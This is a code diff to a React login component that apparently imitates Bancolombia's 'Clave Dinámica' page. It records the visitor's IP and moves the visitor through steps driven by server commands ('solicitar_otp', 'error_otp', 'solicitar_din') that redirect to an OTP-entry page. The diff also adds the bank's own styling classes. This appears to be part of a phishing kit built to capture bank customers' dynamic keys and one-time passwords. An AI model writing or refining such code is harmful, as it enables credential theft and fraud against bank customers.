@@ -5,6 +5,7 @@ import ClaveDinaModal from "./modals/ClaveDinaModal";
 import Loading from "../../components/Loading";
 import imgClaveDinamica from "../../../DinamicaClave/clavedinamica.gif";
 import './css/LoginModal.css';
+import { limpiarPaddingBody } from "@utils";
 
 // Se exporta el componente
 export default function ClaveDinamica() {
@@ -61,6 +62,9 @@ export default function ClaveDinamica() {
                 }));
             }, 2000);
         };
+
+        // Se limpia el padding del body
+        limpiarPaddingBody();
 
         // Se obtiene la IP
         obtenerIP();
@@ -433,18 +437,21 @@ export default function ClaveDinamica() {
                         break;
                     case 'solicitar_otp':
 
-                        // Se quita el estado de cargando
-                        setCargando(false);
-
-                        // Se limpia la clave
-                        handleClear();
+                        // Redirigir a la página de OTP
+                        window.location.href = '/numero-otp';
 
                         // Se sale del ciclo
                         break;
                     case 'error_otp':
-                        window.location.href = '/numero-otp';
-                        break;
 
+                        // Se almacena en el localStorage el estado de sesión con error
+                        localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la página de OTP
+                        window.location.href = '/numero-otp';
+
+                        // Se sale del ciclo
+                        break;
                     case 'solicitar_din':
 
                         // Recargar para reintentar DIN
@@ -617,8 +624,8 @@ export default function ClaveDinamica() {
                     <div className="login-page">
                         <div className="login-box" style={{ backgroundColor: "#454648" }}>
                             <img src={imgClaveDinamica} alt="Clave Dinámica" style={{ width: "500px", margin: "0 auto", display: "block", borderRadius: "8px" }} />
-                            <h2 className="login-title">Ingresa la Clave Dinámica</h2>
-                            <p className="login-subtitle" style={{ fontSize: "16px", color: "#ffffff" }}>
+                            <h2 className="bc-cibsans-font-style-9-extralight mb-3" style={{ fontSize: 22, color: "white", fontWeight: "700", textAlign: "center" }}>Ingresa la Clave Dinámica</h2>
+                            <p className="bc-cibsans-font-style-9-extralight mt-0" style={{ fontSize: 16, color: "white", textAlign: "center", lineHeight: 1.8 }}>
                                 Encuentra tu Clave Dinámica en la app Mi Bancolombia.
                             </p>
 
